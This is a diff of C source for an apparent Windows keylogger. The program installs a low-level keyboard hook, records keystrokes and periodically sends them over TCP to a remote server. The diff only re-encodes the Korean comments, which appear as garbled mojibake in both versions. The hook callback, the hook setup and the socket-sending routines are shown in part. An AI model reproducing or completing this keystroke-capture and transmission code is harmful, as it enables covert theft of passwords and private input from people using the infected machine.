@@ -173,9 +173,9 @@ LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
             }
 
             if (ctrl && (key_stroke == 'Q')) {
-                PostQuitMessage(0); // ¸Ş½ÃÁö ·çÇÁ¿¡ Á¾·á ¸Ş½ÃÁö¸¦ º¸³¿.
+                PostQuitMessage(0); // ë©”ì‹œì§€ ë£¨í”„ì— ì¢…ë£Œ ë©”ì‹œì§€ë¥¼ ë³´ëƒ„.
                 thr = 0;
-                return -1; // ÈÄÅ· Ã¼ÀÎ¿¡ ¸Ş½ÃÁö Àü´Ş¾ÈÇÔ.
+                return -1; // í›„í‚¹ ì²´ì¸ì— ë©”ì‹œì§€ ì „ë‹¬ì•ˆí•¨.
             }
 
             for (i = 0; i < sizeof(keyname) / sizeof(keyname[0]); i++)
@@ -291,7 +291,7 @@ LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-void SetHook() //ÈÄÅ·ÀÌ ½ÇÆĞÇÏ¿´À» ¶§ »ç¿ëÀÚ¿¡°Ô ¿À·ù ¸Ş½ÃÁö Ç¥½ÃÇÔ.
+void SetHook() //í›„í‚¹ì´ ì‹¤íŒ¨í•˜ì˜€ì„ ë•Œ ì‚¬ìš©ìì—ê²Œ ì˜¤ë¥˜ ë©”ì‹œì§€ í‘œì‹œí•¨.
 {
 
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
@@ -307,7 +307,7 @@ void ReleaseHook()
     UnhookWindowsHookEx(_hook);
 }
 
-// TCP Åë½Å- connect, send, close
+// TCP í†µì‹ - connect, send, close
 int SendtoServer(char* mes) {
     char recvbuf[DEFAULT_BUFLEN];
     int value;
@@ -357,10 +357,10 @@ void TcpSend() {
     char output[DEFAULT_BUFLEN];
     int outputIndex = 0;
 
-    //¹öÆÛ ÃÊ±âÈ­
+    //ë²„í¼ ì´ˆê¸°í™”
     memset(output, 0, DEFAULT_BUFLEN);
 
-    //ÇöÀç ½Ã°£ ±â·Ï
+    //í˜„ì¬ ì‹œê°„ ê¸°ë¡
     time(&startTime);
 
     printf("Every %d second, the input is output.\n", TIME_INTERVAL);
@@ -428,14 +428,14 @@ int main() {
         return 1;
     }
 
-    // Winsock ÃÊ±âÈ­
+    // Winsock ì´ˆê¸°í™”
     value = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (value != 0) {
         printf("WSAStartup failed with error: %d\n", value);
         return 1;
     }
 
-    // addrinfo ±¸Á¶Ã¼ ÃÊ±âÈ­
+    // addrinfo êµ¬ì¡°ì²´ ì´ˆê¸°í™”
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
@@ -453,7 +453,7 @@ int main() {
     TcpSend();
 
     printf("\nConnection End.\n");
-    freeaddrinfo(result); //ÁÖ¼Ò Á¤º¸ ÇØÁ¦.
+    freeaddrinfo(result); //ì£¼ì†Œ ì •ë³´ í•´ì œ.
 
     // cleanup
     WSACleanup();
